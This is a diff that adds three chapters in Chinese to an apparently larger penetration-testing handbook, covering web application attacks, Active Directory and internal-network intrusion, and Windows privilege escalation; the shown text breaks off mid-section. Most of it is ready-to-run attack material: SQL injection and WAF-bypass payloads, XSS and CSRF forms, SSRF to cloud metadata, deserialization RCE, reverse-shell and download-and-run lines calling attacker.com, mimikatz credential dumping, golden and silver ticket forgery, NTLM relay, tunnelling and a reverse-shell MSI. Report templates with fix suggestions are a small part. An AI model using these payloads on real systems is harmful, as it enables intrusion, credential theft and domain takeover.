@@ -3456,6 +3456,2857 @@ for pkt in pkts:
 
 ---
 
+## 第 18 章 · Web 应用渗透专章
+
+**目的**：Web 应用是渗透测试最常见的入口。研究员要会 OWASP Top 10 全套漏洞识别、利用、绕过 WAF、写 PoC 和报告。
+
+### 18.1 OWASP Top 10 速查
+
+```
+A01:2021 访问控制失效（BAC / 越权）
+A02:2021 加密机制失效（弱算法 / 明文 / 默认密钥）
+A03:2021 注入（SQL / NoSQL / OS / LDAP）
+A04:2021 不安全设计（业务逻辑漏洞）
+A05:2021 安全配置错误（默认账号 / 错误信息泄漏）
+A06:2021 脆弱过时组件（CVE 库匹配）
+A07:2021 身份认证失效（弱密码 / 验证码绕过）
+A08:2021 软件数据完整性失效（反序列化 / CI/CD）
+A09:2021 安全日志监控失效（无可观测性）
+A10:2021 SSRF（服务端请求伪造）
+```
+
+### 18.2 SQL 注入
+
+**类型**：
+- 联合注入：UNION SELECT
+- 布尔盲注：AND 1=1 / AND 1=2
+- 时间盲注：SLEEP(5) / WAITFOR DELAY
+- 报错注入：extractvalue / updatexml
+- 堆叠注入：;DROP TABLE
+- 二阶注入：写入后再读出
+
+**工具链**：
+```bash
+# sqlmap
+sqlmap -u "http://target/?id=1" --dbs --batch
+sqlmap -u "http://target/?id=1" -D dbname --tables
+sqlmap -u "http://target/?id=1" --file-read=/etc/passwd
+sqlmap -u "http://target/?id=1" --os-shell
+
+# Burp + Manual
+# 1. 抓包
+# 2. 找注入点
+# 3. 判断数据库类型（MySQL/MSSQL/PostgreSQL/Oracle/SQLite）
+# 4. 提取 schema
+# 5. 提取数据
+```
+
+**WAF 绕过**：
+```sql
+# 大小写
+uNiOn SeLeCt
+# 注释
+UN/**/ION SE/**/LECT
+# 编码
+%55nion %53elect
+# 等价函数
+-1 UNION SELECT 1,2,3
+database() / schema() / version() / @@version
+# 二次编码
+%2520UNION%2520SELECT
+# HPP (HTTP Parameter Pollution)
+?id=1&id=2 UNION SELECT
+# 换行
+%0a / %0b / %0c / %0d
+```
+
+### 18.3 XSS / CSRF / CORS
+
+**XSS 类型**：
+```html
+<!-- 反射型 -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+
+<!-- 存储型 -->
+存入数据库 → 用户访问 → 触发
+常见点：评论区、用户资料、私信
+
+<!-- DOM 型 -->
+document.location.hash / document.referrer
+innerHTML / outerHTML / document.write
+```
+
+**XSS 绕过**：
+```html
+<!-- 编码绕过 -->
+<img src=x onerror=&#x61;lert(1)>
+<img src=x onerror="\x61lert(1)">
+
+<!-- 标签替换 -->
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+<!-- CSP 绕过 -->
+<script src="data:text/javascript,alert(1)">
+<script src="https://whitelisted.com/evil.js">
+```
+
+**CSRF**：
+```html
+<!-- 自动提交表单 -->
+<form action="http://target/api/transfer" method=POST>
+  <input name=to value=attacker>
+  <input name=amount value=10000>
+</form>
+<script>document.forms[0].submit()</script>
+
+<!-- JSON CSRF (Content-Type: text/plain) -->
+<script>
+fetch('http://target/api/transfer', {
+  method: 'POST',
+  headers: {'Content-Type': 'text/plain'},
+  body: '{"to":"attacker","amount":10000}'
+})
+</script>
+```
+
+**CORS 配置错误**：
+```http
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+任意域 + 凭据 = 完全接管
+
+### 18.4 SSRF
+
+**利用点**：
+```bash
+# 内部服务探测
+?url=http://127.0.0.1:8080
+?url=http://localhost:6379/  # Redis
+?url=http://169.254.169.254/  # AWS 元数据
+?url=file:///etc/passwd
+?url=gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+
+# 协议
+http:// / https:// / file:// / gopher:// / dict:// / ftp:// / ldap://
+# IP 进制转换
+http://2130706433/  # 127.0.0.1
+http://0x7f000001/
+http://017700000001/
+http://[::1]/
+http://127.1/
+
+# DNS rebinding
+attacker.com → 1.1.1.1 → 验证后 → 127.0.0.1
+```
+
+**云元数据 SSRF**：
+```bash
+# AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# 阿里云
+http://100.100.100.200/latest/meta-data/
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+# 自定义 header: Metadata-Flavor: Google
+```
+
+### 18.5 反序列化漏洞
+
+**Java**：
+```bash
+# ysoserial 工具
+java -jar ysoserial-all.jar CommonsCollections6 "cmd" > payload.bin
+# ysoserial 生成 gadget 链
+# CC1 / CC2 / CC3 / CC4 / CC5 / CC6 / CC7
+# Jdk7u21 / Jdk8u20
+# ROME / BeanShell / C3P0 / Groovy
+
+# JRMP 协议
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "cmd"
+# 目标反连到 JRMPListener 触发
+
+# 指纹
+whitelabel error page / Spring Boot
+java.io.ObjectInputStream / readObject
+```
+
+**PHP**：
+```php
+// 魔术方法触发
+__wakeup() / __destruct() / __toString() / __call()
+// POP 链构造
+// 工具: phpggc
+phpggc Symfony/RCE1 'system("id");' -b
+```
+
+**Python pickle**：
+```python
+import pickle
+class Exploit(object):
+    def __reduce__(self):
+        import os
+        return (os.system, ('id',))
+payload = pickle.dumps(Exploit())
+```
+
+**.NET ViewState**：
+```bash
+# ysoserial.net
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd" --validationalg=SHA1 --validationkey=...
+```
+
+### 18.6 文件上传 / 包含
+
+**绕过黑名单**：
+```bash
+# 后缀大小写
+.PhP / .pHp
+# 双写
+.pphphp
+# Apache 解析
+.php.123 / .php.xxx
+# IIS 解析
+.asp;.jpg / .cer / .asa / .cdx
+# phtml / php3 / php4 / php5 / php7
+# .htaccess
+AddType application/x-httpd-php .jpg
+```
+
+**绕过白名单**：
+```bash
+# 0x00 截断
+shell.php%00.jpg
+# 二次渲染
+# 用工具生成可绕过二次渲染的图片马
+# 文件头 + payload
+GIF89a<?php system($_GET['c']); ?>
+# 条件竞争
+不停上传 + 不停访问
+```
+
+**LFI/RFI**：
+```php
+?file=../../../../etc/passwd
+?file=....//....//....//....//etc/passwd
+?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://input  + POST <?php system('id');?>
+?file=data://text/plain,<?php system('id');?>
+?file=expect://id
+?file=zip://shell.zip%23shell.php
+?file=phar://shell.phar/shell.php
+```
+
+### 18.7 命令注入
+
+**Linux**：
+```bash
+; id
+| id
+|| id
+& id
+&& id
+$(id)
+`id`
+%0aid
+; cat /etc/passwd
+; nc -e /bin/sh attacker.com 4444
+; curl http://attacker.com/shell.sh | bash
+```
+
+**Windows**：
+```cmd
+& ipconfig
+| whoami
+|| calc
+&& dir
+%0aipconfig
+```
+
+**绕过**：
+```bash
+# 空格
+${IFS} / $IFS$9 / < / > / %09
+# 黑名单
+c""at → cat
+ca$@t → cat
+'ca't' → cat
+# 通配符
+/???/c?t /?t? /???/?a? /???/c?t ???
+# base64
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+```
+
+### 18.8 越权 / IDOR / 业务逻辑
+
+**水平越权**：
+```bash
+# 修改 ID
+GET /api/user/1001  →  GET /api/user/1002
+GET /api/order/5001  →  GET /api/order/5002
+POST /api/profile  {"user_id": 1001}  →  {"user_id": 1002}
+```
+
+**垂直越权**：
+```bash
+# 普通用户访问管理员接口
+/Admin  →  /admin/user/delete
+/api/admin/list  →  添加 admin cookie
+/api/role/admin  → 改 body 字段
+```
+
+**业务逻辑漏洞**：
+```bash
+# 支付金额篡改
+POST /api/pay
+{"product_id": 1, "price": 100}
+→  {"product_id": 1, "price": 0.01}
+
+# 数量负数
+{"qty": 1, "price": 100}  →  {"qty": -1, "price": 100}
+
+# 优惠券叠加
+使用多个优惠码
+# 整数溢出
+{"amount": 99999999999}
+# 并发竞争
+同时发 100 个请求扣款
+# 状态绕过
+{"order_status": "paid"}  →  {"order_status": "shipped"}
+```
+
+### 18.9 JWT 攻击
+
+**none 算法**：
+```json
+// Header
+{"alg": "none", "typ": "JWT"}
+// Payload
+{"sub": "admin"}
+// Signature: 空
+```
+
+**算法混淆（RS256 → HS256）**：
+```python
+# 服务端用公钥验证 HS256
+# 攻击者用公钥作为 HS256 密钥签名
+import jwt
+public_key = open("public.pem").read()
+token = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
+```
+
+**密钥爆破**：
+```bash
+# jwt_tool / hashcat
+hashcat -m 16500 jwt.txt rockyou.txt
+# john
+john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+```
+
+**kid 注入**：
+```json
+{"alg": "HS256", "kid": "../../dev/null"}
+// 用 /dev/null 当密钥
+{"alg": "HS256", "kid": "key1"}
+// kid SQL 注入
+```
+
+### 18.10 XXE / XPath / LDAP 注入
+
+**XXE**：
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+<!-- 内网探测 -->
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+<!-- RCE (expect) -->
+<!ENTITY xxe SYSTEM "expect://id">
+<!-- OOB 外带 -->
+<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+%xxe;
+```
+
+**XPath**：
+```xpath
+' or '1'='1
+'] | //user/* | //user[contains(.,
+'admin') or 1=1]/password | //user
+```
+
+**LDAP**：
+```
+*)(uid=*))(|(uid=*
+admin*)(|(password=*)
+```
+
+### 18.11 WAF 绕过
+
+**请求方法**：
+```bash
+# GET 改 POST
+GET /api?id=1' AND 1=1--
+→ POST /api body: id=1' AND 1=1--
+
+# 异常方法
+PATCH /api?id=1
+DELETE /api?id=1
+```
+
+**分块传输**：
+```http
+POST /api
+Transfer-Encoding: chunked
+
+0
+id=1
+UNION
+SELECT
+1,2,3
+```
+
+**参数污染**：
+```http
+?id=1&id=1' AND 1=1--
+?id=1&id=1 UNION SELECT 1,2,3
+```
+
+**协议级绕过**：
+```bash
+# Content-Type 切换
+Content-Type: application/x-www-form-urlencoded → multipart/form-data
+Content-Type: application/json → text/xml
+
+# 大小写混合
+User-Agent: MoZiLLa/5.0
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+```
+
+**Payload 编码**：
+```bash
+# 二次 URL 编码
+%2520 → %20
+# Unicode 编码
+\u003cscript\u003e
+# HTML 实体
+&lt;script&gt;
+# 混合编码
+a%00lert(1)
+```
+
+### 18.12 Web 渗透工具链
+
+**主动扫描**：
+```bash
+# nuclei
+nuclei -u https://target.com -t cves/ -t vulnerabilities/
+# nikto
+nikto -h https://target.com
+# wpscan
+wpscan --url https://target.com --enumerate ap,at,u
+# sqlmap
+sqlmap -u "url?id=1" --batch
+# Burp Suite Pro
+# 主动 + 被动扫描
+# xray
+xray webscan --basic-crawler https://target.com
+```
+
+**被动流量**：
+```bash
+# Burp + 浏览器代理
+# mitmproxy
+mitmdump -s script.py -p 8080
+# 流量重放
+# ffuf / wfuzz
+ffuf -u https://target.com/api?FUZZ=test -w wordlist.txt
+wfuzz -c -z file,wordlist.txt https://target.com/api?FUZZ=test
+```
+
+**指纹识别**：
+```bash
+# whatweb / wappalyzer
+whatweb https://target.com
+# dirmap / dirsearch
+dirsearch -u https://target.com
+# EHole
+EHole -l url.txt
+# glass / fingerprint
+```
+
+### 18.13 Web 渗透报告模板
+
+```
+【Web 渗透报告】CASE-YYYY-NNNN
+
+【目标信息】
+- URL: <target>
+- 技术栈: <PHP/Java/Python/Node>
+- WAF: <Cloudflare/AWS WAF/雷池>
+- CDN: <Cloudflare/阿里云/腾讯云>
+- 域名信息: <whois/dns>
+- 子域: <list>
+
+【信息收集】
+- 端口扫描: <list>
+- 服务识别: <list>
+- 目录扫描: <list>
+- 指纹识别: <list>
+
+【漏洞清单】
+- SQL 注入:
+  - URL: <api/endpoint>
+  - 参数: <id>
+  - 类型: <UNION / Boolean / Time>
+  - 利用: <sqlmap 截图>
+  - 影响: <数据库 100 万条用户>
+- XSS:
+  - URL: <api/comment>
+  - 类型: <Stored / Reflected / DOM>
+  - Payload: <script>alert(1)</script>
+  - 影响: <管理后台 Cookie 窃取>
+- SSRF:
+  - URL: <api/fetch>
+  - 利用: <gopher:// 攻击内网 Redis>
+  - 影响: <云元数据泄漏 + 凭据>
+- ...
+
+【PoC】
+- <完整 PoC 代码>
+- <利用步骤 + 截图>
+- <危害证明>
+
+【修复建议】
+- 参数化查询 / ORMs
+- CSP / X-XSS-Protection
+- URL 白名单
+- ...
+
+【防御视角】
+- 开发：参数化查询、输入验证
+- 运维：WAF、HIDS
+- 管理：SDL、最小权限
+```
+
+---
+
+## 第 19 章 · 内网渗透专章
+
+**目的**：拿到边界权限后，研究员要进内网横向移动、域渗透、凭据转储。本章覆盖 Active Directory / Windows / Linux 内网全套技术。
+
+### 19.1 信息收集（内网）
+
+```bash
+# 网络发现
+arp-scan -l
+nmap -sn 192.168.1.0/24
+masscan -p1-65535 10.0.0.0/8 --rate=10000
+
+# 端口扫描
+nmap -sV -sC -p- 192.168.1.10
+rustscan -a 192.168.1.10 -- -sV
+
+# 服务识别
+nmap --script=vuln 192.168.1.10
+searchsploit <service>
+```
+
+**Windows 信息收集**：
+```powershell
+# 网络
+ipconfig /all
+arp -a
+route print
+netstat -ano
+net view /domain
+net view \\dc01
+
+# 用户
+net user
+net localgroup administrators
+net group "Domain Admins" /domain
+whoami /all
+
+# 凭据
+cmdkey /list
+# mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+sekurlsa::kerberos
+lsadump::sam
+lsadump::dcsync
+
+# 共享
+net share
+net use \\target\IPC$
+
+# 进程
+tasklist /v
+wmic process list full
+Get-Process
+```
+
+**Linux 信息收集**：
+```bash
+# 系统
+uname -a
+cat /etc/os-release
+ps aux
+ps -ef
+
+# 网络
+ip a
+ss -tulpn
+netstat -tulpn
+cat /etc/hosts
+cat /etc/resolv.conf
+arp -a
+
+# 用户
+cat /etc/passwd
+cat /etc/shadow
+last -a
+lastlog
+w
+id
+sudo -l
+
+# 凭据
+cat ~/.bash_history
+cat ~/.ssh/id_rsa
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.conf" -path "*/mysql/*" 2>/dev/null
+cat /etc/mysql/my.cnf
+
+# 定时任务
+crontab -l
+ls -la /etc/cron*
+cat /etc/crontab
+
+# SUID
+find / -perm -4000 2>/dev/null
+```
+
+### 19.2 凭据转储
+
+**Windows**：
+```bash
+# mimikatz
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords  # 内存中的明文密码
+lsadump::sam             # SAM 哈希
+lsadump::dcsync          # 域控同步
+
+# lsass 进程内存
+procdump.exe -ma lsass.exe lsass.dmp
+# 离线用 mimikatz / pypykatz 解析
+
+# pypykatz
+pypykatz rekall lsass.dmp
+# 需 python + pip install pypykatz
+
+# 注册表
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive
+# secretsdump.py 解析
+
+# DPAPI
+mimikatz sekurlsa::dpapi
+
+# Kerberos 票据
+mimikatz sekurlsa::tickets /export
+kerberos::list /export
+# 离线破解
+```
+
+**Linux**：
+```bash
+# shadow
+cat /etc/shadow
+
+# 内存
+# LiME (Linux Memory Extractor)
+# volatility3
+volatility3 -f lime.dump --profile=LinuxUbuntu5.15
+
+# SSH key
+find / -name "id_rsa" 2>/dev/null
+cat ~/.ssh/authorized_keys
+
+# 历史命令
+cat ~/.bash_history
+cat ~/.zsh_history
+cat /home/*/.bash_history
+
+# 配置文件
+cat /etc/passwd
+cat ~/.my.cnf
+cat /opt/*/config/*.yml
+cat /opt/*/.env
+```
+
+**离线哈希破解**：
+```bash
+# hashcat
+hashcat -m 1000 hash.txt rockyou.txt      # NTLM
+hashcat -m 1800 hash.txt rockyou.txt      # sha512crypt
+hashcat -m 13100 hash.txt rockyou.txt     # Kerberoast
+
+# john
+john --wordlist=rockyou.txt hash.txt
+```
+
+### 19.3 横向移动
+
+**Windows**：
+```bash
+# 1. WMI
+wmic /node:target /user:admin /password:pass process call create "cmd.exe /c ipconfig"
+
+# 2. PsExec
+psexec \\target -u admin -p pass cmd.exe
+
+# 3. PsRemoting
+Invoke-Command -ComputerName target -ScriptBlock {ipconfig} -Credential admin
+
+# 4. WinRM
+winrs -r:target -u:admin -p:pass "cmd"
+
+# 5. SMB
+net use \\target\IPC$ /user:admin pass
+copy file.exe \\target\C$\Windows\Temp\
+at \\target 14:00 C:\Windows\Temp\file.exe
+
+# 6. RDP
+mstsc /v:target /u:admin
+
+# 7. DCOM
+[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","target"))
+
+# 8. WMI Event
+wmic /node:target process call create "cmd.exe"
+```
+
+**Linux**：
+```bash
+# 1. SSH
+ssh admin@target
+# 密钥登录
+ssh -i id_rsa admin@target
+# SSH Agent 转发
+ssh -A admin@bastion
+# sshuttle 隧道
+sshuttle -r admin@bastion 10.0.0.0/8
+
+# 2. SCP
+scp file admin@target:/tmp/
+
+# 3. rsync
+rsync -avz file admin@target:/tmp/
+
+# 4. Telnet
+telnet target 23
+
+# 5. SNMP
+snmpwalk -v2c -c public target
+```
+
+**impacket 工具集**：
+```bash
+# psexec.py
+psexec.py admin:pass@target
+
+# wmiexec.py
+wmiexec.py admin:pass@target
+
+# smbexec.py
+smbexec.py admin:pass@target
+
+# atexec.py
+atexec.py admin:pass@target "cmd"
+
+# dcomexec.py
+dcomexec.py admin:pass@target
+
+# secretsdump.py
+secretsdump.py admin:pass@target
+
+# mssqlclient.py
+mssqlclient.py admin:pass@target
+```
+
+### 19.4 域渗透 · Kerberos 攻击
+
+**Kerberoast**：
+```bash
+# 1. 查找 SPN 账户
+GetUserSPNs.py domain.local/admin:pass -dc-ip 10.0.0.1
+
+# 2. 请求 TGS 票据
+GetUserSPNs.py domain.local/admin:pass -dc-ip 10.0.0.1 -request
+
+# 3. 离线破解
+hashcat -m 13100 ticket.txt rockyou.txt
+```
+
+**AS-REP Roast**：
+```bash
+# 1. 找不需预认证的用户
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1
+
+# 2. AS-REP 离线破解
+hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+**Pass-the-Hash (PtH)**：
+```bash
+# NTLM Hash 直接登录
+pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:hash //target cmd
+# impacket
+psexec.py -hashes aad3b435b51404ee:hash admin@target
+wmiexec.py -hashes aad3b435b51404ee:hash admin@target
+```
+
+**Pass-the-Ticket (PtT)**：
+```bash
+# 1. 导出票据
+mimikatz sekurlsa::tickets /export
+
+# 2. 注入票据
+mimikatz kerberos::ptt ticket.kirbi
+# impacket
+export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass target
+```
+
+**Overpass-the-Hash (OPtH)**：
+```bash
+# 用 NTLM Hash 请求 TGT
+mimikatz sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd
+```
+
+**Golden Ticket (黄金票据)**：
+```bash
+# 1. 导出 krbtgt 哈希
+lsadump::dcsync /user:krbtgt
+# 哈希 = 502...b411a...
+
+# 2. 伪造任意用户的 TGT
+mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
+
+# 3. 访问域内任意服务
+dir \\dc01\C$
+```
+
+**Silver Ticket (白银票据)**：
+```bash
+# 1. 导出服务账户哈希
+mimikatz sekurlsa::logonpasswords
+# 找到 SQLService 账户的 NTLM Hash
+
+# 2. 伪造对应服务的 TGS
+mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:cifs /rc4:hash /ptt
+
+# 3. 访问 cifs 服务
+dir \\dc01\C$
+```
+
+**DCSync**：
+```bash
+# 域管权限下，从域控同步所有账户哈希
+lsadump::dcsync /user:Administrator
+lsadump::dcsync /domain:domain.local /all
+secretsdump.py -just-dc-user:Administrator domain.local/admin:pass@dc01
+```
+
+**DCShadow**：
+```bash
+# 临时把域控权限给自己
+mimikatz !misc::dcshadow /setacl:dc01.domain.local
+```
+
+### 19.5 NTLM 中继
+
+```bash
+# Responder + ntlmrelayx
+# 1. Responder 监听 LLMNR/NBNS/mDNS
+responder.py -I eth0 -wrf
+# 2. ntlmrelayx 转发凭据
+ntlmrelayx.py -tf targets.txt -smb2support -socks
+# 3. 用户尝试访问 SMB 共享 → 凭据被中继到目标
+```
+
+**打印机漏洞 (PrinterBug / MS-RPRN)**：
+```bash
+# 强制域控向攻击者认证
+printerbug.py domain.local/user:pass@dc01 attacker_ip
+# 配合 ntlmrelayx 拿下域控
+```
+
+**Coercer**：
+```bash
+# 多种协议触发
+coercer -u user -p pass -d domain.local -t target -l attacker
+```
+
+### 19.6 域信息收集
+
+**BloodHound**：
+```bash
+# 1. 收集数据
+bloodhound-python -u admin -p 'pass' -d domain.local -ns 10.0.0.1 -c All
+
+# 2. 启动 neo4j
+neo4j start
+# 登录 http://localhost:7474 → 修改密码
+
+# 3. 启动 BloodHound
+bloodhound &
+# 导入 JSON → 查询：
+#   - 最短路径到 Domain Admins
+#   - 所有 Kerberoastable 账户
+#   - AS-REP Roastable 账户
+#   - ACL 攻击路径
+```
+
+**PowerView**：
+```powershell
+# 域信息
+Get-NetDomain
+Get-NetDomainController
+Get-NetUser
+Get-NetUser -AdminCount
+Get-NetGroup "Domain Admins" -FullData
+Get-NetComputer
+Get-NetComputer -Unconstrained
+Get-NetOU
+
+# ACL
+Find-InterestingDomainAcl
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+
+# 委派
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+Get-DomainUser -AllowDelegation
+
+# 凭据
+Invoke-Kerberoast
+Get-DomainSPNTicket
+
+# 攻击路径
+Find-LocalAdminAccess
+Invoke-UserHunter
+Invoke-UserHunter -CheckAccess
+```
+
+**SharpHound**（编译版）：
+```powershell
+# 收集
+.\SharpHound.exe -c All -d domain.local --DomainController 10.0.0.1
+# 导入 BloodHound
+```
+
+### 19.7 委派攻击
+
+**非约束委派**：
+```bash
+# 1. 查找配置了非约束委派的账户/机器
+Get-NetComputer -Unconstrained
+Get-NetUser -Unconstrained
+
+# 2. 拿到机器，导出 TGT
+mimikatz sekurlsa::tickets /export
+# 找 dc01 的 TGT
+
+# 3. 注入 TGT 攻击域控
+mimikatz kerberos::ptt dc01.kirbi
+```
+
+**约束委派**：
+```bash
+# 1. 查找配置了约束委派的账户
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+# 2. 用 S4U2Self + S4U2Proxy 申请任意服务的票据
+getST.py -spn cifs/dc01 -impersonate Administrator -dc-ip 10.0.0.1 domain.local/service:pass
+
+# 3. 用票据访问
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass dc01
+```
+
+**基于资源的约束委派 (RBCD)**：
+```bash
+# 1. 创建机器账户
+addcomputer.py -method LDAPS -computer-name EVIL$ -computer-pass pass123 domain.local/user:pass
+
+# 2. 配置 RBCD 让 EVIL 机器可以委派给 dc01
+rbcd.py -delegate-from 'EVIL$' -delegate-to 'dc01$' -dc-ip 10.0.0.1 domain.local/user:pass
+
+# 3. 用 EVIL 机器账户申请票据
+getST.py -spn cifs/dc01.domain.local -impersonate Administrator -dc-ip 10.0.0.1 domain.local/'EVIL$':pass123
+```
+
+### 19.8 域林 / 子域渗透
+
+```bash
+# 1. 域信任枚举
+Get-DomainTrust
+Get-ForestTrust
+# 找 SID Filtering 关闭的双向信任
+
+# 2. 跨域 SID History
+# 在父域有 Golden Ticket → 子域可访问
+mimikatz kerberos::golden /user:admin /domain:parent.local /sid:S-1-5-21-PARENT /krbtgt:parent_hash /sids:S-1-5-21-CHILD-519 /ptt
+
+# 3. 跨域攻击
+# 父域域管 → 子域域管
+```
+
+### 19.9 内网穿透 / 隧道
+
+**端口转发**：
+```bash
+# ssh 端口转发
+ssh -L 8080:target:80 user@bastion
+ssh -R 8080:target:80 user@bastion
+ssh -D 1080 user@bastion  # SOCKS
+
+# netsh (Windows)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=target
+
+# socat
+socat TCP-LISTEN:8080,fork,reuseaddr TCP:target:80
+socat TCP-LISTEN:8080,fork TCP:attacker:4444
+
+# rinetd
+# /etc/rinetd.conf
+0.0.0.0 8080 target 80
+```
+
+**SOCKS 代理**：
+```bash
+# sshuttle (Linux)
+sshuttle -r user@bastion 10.0.0.0/8
+
+# chisel
+chisel server -p 8000 --reverse
+chisel client attacker:8000 R:socks
+# proxychains 配置 socks5 127.0.0.1 1080
+
+# frp
+frps.ini:
+[common]
+bind_port = 7000
+frpc.ini:
+[common]
+server_addr = attacker
+server_port = 7000
+[socks5]
+type = tcp
+local_port = 1080
+remote_port = 1080
+
+# nps / ehc / xray
+```
+
+**ICMP / DNS 隧道**：
+```bash
+# icmpsh
+icmpsh -t attacker_ip
+
+# dns2tcp
+dns2tcpc -d 1 -r ssh -l 1080 -z tunnel.attacker.com
+
+# iodine
+iodine -f -P pass tunnel.attacker.com
+
+# dnscat2
+dnscat2 --domain=tunnel.attacker.com
+```
+
+**HTTP 隧道**：
+```bash
+# reGeorg
+# 上传 tunnel.aspx 到内网 Web 服务器
+python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
+
+# neo-reGeorg (新一代)
+# 支持更多脚本 + 加密
+
+# ABPTTS
+python abpttsclient.py -c webshell.jsp 1080
+```
+
+### 19.10 内网渗透报告模板
+
+```
+【内网渗透报告】CASE-YYYY-NNNN
+
+【网络拓扑】
+- 边界 IP: <10.0.0.5>
+- 内网网段: <10.0.0.0/24, 172.16.0.0/16>
+- 域: <domain.local>
+- 域控: <dc01.domain.local / dc02.domain.local>
+- 关键资产: <list>
+
+【初始立足点】
+- 入口: <钓鱼 / 漏洞 / 弱口令>
+- 权限: <IIS AppPool / 域用户>
+- 凭据获取: <mimikatz / lsass dump>
+
+【信息收集】
+- 域用户: <50>
+- 域管: <5>
+- 关键机器: <DC / Exchange / FileServer>
+- ACL 攻击路径: <BloodHound 截图>
+
+【横向移动】
+- 攻击路径: <Web → file server → DC>
+- 利用技术: <WMI / PsExec / WinRM>
+- 获取凭据: <krbtgt hash, 域管 hash>
+
+【域权限提升】
+- 路径 1: <Kerberoast + 离线破解 + 委派攻击>
+- 路径 2: <ACL 滥用 + DCSync>
+- 最终: <Enterprise Admin>
+
+【关键发现】
+- 漏洞: <MS17-010, MS-RPRN, 不安全 ACL>
+- 凭据: <30 个明文密码, 5 个域管 hash>
+- 凭据复用: <80%>
+
+【修复建议】
+- 域控补丁
+- LAPS 部署（本地管理员）
+- 凭据保护 (Credential Guard, Protected Users)
+- ACL 审计
+- 蜜罐 / 异常检测
+
+【防御视角】
+- 最小权限
+- 凭据轮换
+- 日志监控（4624/4625/4769）
+- 行为分析 (UEBA)
+```
+
+---
+
+## 第 20 章 · 权限提升与持久化专章
+
+**目的**：拿到 shell 后要提权（USER → SYSTEM / user → root）、留后门（持久化）、清痕迹。本章覆盖 Windows + Linux 全套提权与持久化技术。
+
+### 20.1 Windows 权限提升
+
+**信息收集**：
+```cmd
+# 系统信息
+systeminfo
+wmic qfe list
+wmic os get caption,version,buildnumber
+
+# 当前用户
+whoami /all
+whoami /groups
+whoami /priv
+
+# 网络
+netstat -ano
+arp -a
+route print
+
+# 进程
+tasklist /v
+wmic process list full
+
+# 计划任务
+schtasks /query /fo LIST
+
+# 服务
+sc query
+wmic service list brief
+accesschk.exe -uwcv "Everyone" * /accepteula
+
+# 安装程序
+wmic product get name,version,vendor
+
+# 自动登录凭据
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul
+```
+
+**服务提权**：
+```cmd
+# 1. 查找弱权限服务
+accesschk.exe -uwcv "Everyone" * /accepteula
+accesschk.exe -uwcv "Users" * /accepteula
+accesschk.exe -uwcv "BUILTIN\Users" *
+
+# 2. 找到可写服务
+sc config "VulnService" binpath= "C:\Windows\Temp\shell.exe"
+sc stop "VulnService"
+sc start "VulnService"
+
+# 3. 计划任务
+schtasks /create /tn "Evil" /tr "C:\shell.exe" /sc once /st 00:00 /ru system
+schtasks /run /tn "Evil"
+
+# 4. AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# 都为 1 → 可安装 MSI 提权
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
+msiexec /quiet /qn /i evil.msi
+```
+
+**UAC 绕过**：
+```bash
+# UACME 项目
+Akagi64.exe <number>
+# 编号对应不同绕过方法
+
+# 手动：fodhelper.exe
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe"
+# fodhelper.exe 触发 → 启动 cmd 但继承管理员 token
+
+# eventvwr.exe
+# computerdefaults.exe
+# sdclt.exe
+```
+
+**Potato 系列（服务账户 → SYSTEM）**：
+```bash
+# JuicyPotato
+JuicyPotato.exe -l 9999 -p "C:\shell.exe" -t * -c {CLSID}
+# CLSID 列表
+# https://ohpe.it/juicy-potato/CLSID/
+
